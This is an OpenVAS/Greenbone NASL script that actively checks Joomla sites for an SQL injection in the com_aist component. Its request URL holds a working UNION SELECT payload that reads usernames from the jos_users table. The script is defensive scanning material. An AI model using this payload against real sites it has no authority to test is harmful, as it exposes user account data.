# Copyright (C) 2011 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801787");
  script_version("2022-06-03T08:34:33+0000");
  script_tag(name:"last_modification", value:"2022-06-03 08:34:33 +0000 (Fri, 03 Jun 2022)");
  script_tag(name:"creation_date", value:"2011-05-18 15:37:30 +0200 (Wed, 18 May 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Joomla Component com_aist SQLi Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_tag(name:"summary", value:"Joomla! is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Input passed via the 'view' parameter to 'index.php' is not
  properly sanitised before using to construct SQL queries.");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to injection
  arbitrary SQL constructs and gain sensitive information.");

  script_tag(name:"affected", value:"Joomla! Aist component.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/100891/joomlaaist-sql.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/index.php?option=com_aist&view=vacancylist&contact_id=-3 AND 1=2 UNION' +
            'SELECT 1,2,3,4,group_concat(username,0x3a,0x72616e645f75736572)g3mb3lzfeatnuxbie,6,7,8,9,10,11,12,13,14,15,16,' +
            '17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36 from jos_users--';

req = http_get(item: url, port: port);
res = http_send_recv(port: port, data: req);

if ("> admin:rand_user(.+):rand_user<" >< res) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data:report);
  exit(0);
}

exit(99);
